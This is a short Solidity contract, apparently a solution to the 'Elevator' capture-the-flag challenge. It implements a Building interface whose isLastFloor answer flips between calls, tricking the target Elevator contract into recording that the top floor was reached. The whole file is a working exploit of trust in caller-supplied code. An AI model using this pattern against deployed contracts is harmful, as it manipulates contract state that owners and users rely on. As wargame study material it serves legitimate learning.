// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Elevator.sol";

contract ElevatorHack is Building {
    bool public isLast = false;

    function isLastFloor(uint256) external returns (bool) {
        bool mem = isLast;
        isLast = !isLast;
        return mem;
    }

    function attack(address instance) public {
        Elevator elevator = Elevator(instance);
        elevator.goTo(0); // any number is Ok
    }
}
